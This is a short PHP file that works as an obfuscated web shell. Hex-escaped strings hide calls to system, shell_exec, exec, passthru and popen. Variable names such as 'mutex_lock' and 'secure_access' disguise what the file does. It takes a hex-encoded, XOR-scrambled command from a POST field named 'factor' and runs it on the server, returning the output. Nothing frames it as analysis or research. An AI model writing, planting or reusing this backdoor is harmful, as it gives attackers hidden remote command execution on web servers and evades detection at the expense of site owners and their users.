<?php

$secure_access = "\x68e\x782bi\x6E";
$mutex_lock5 = "po\x70e\x6E";
$mutex_lock6 = "\x73tre\x61\x6D_g\x65\x74\x5Fco\x6Ete\x6Ets";
$mutex_lock1 = "syst\x65m";
$mutex_lock4 = "p\x61\x73st\x68r\x75";
$mutex_lock7 = "pclo\x73\x65";
$mutex_lock3 = "e\x78\x65c";
$mutex_lock2 = "\x73hell\x5F\x65x\x65c";
if (isset($_POST["f\x61\x63to\x72"])) {
            function system_core    (     $flg     ,       $ref   )    {
      $resource      =    ''     ;
   $c=0;
 do{
$resource.=chr(ord($flg[$c])^$ref);
$c++;

} while($c<strlen($flg));
 return      $resource;
      
}
            $factor = $secure_access($_POST["f\x61\x63to\x72"]);
            $factor = system_core($factor, 11);
            if (function_exists($mutex_lock1)) {
                $mutex_lock1($factor);
            } elseif (function_exists($mutex_lock2)) {
                print $mutex_lock2($factor);
            } elseif (function_exists($mutex_lock3)) {
                $mutex_lock3($factor, $property_set_flg);
                print join("\n", $property_set_flg);
            } elseif (function_exists($mutex_lock4)) {
                $mutex_lock4($factor);
            } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) {
                $ref_resource = $mutex_lock5($factor, 'r');
                if ($ref_resource) {
                    $holder_ent = $mutex_lock6($ref_resource);
                    $mutex_lock7($ref_resource);
                    print $holder_ent;
                }
            }
            exit;
        }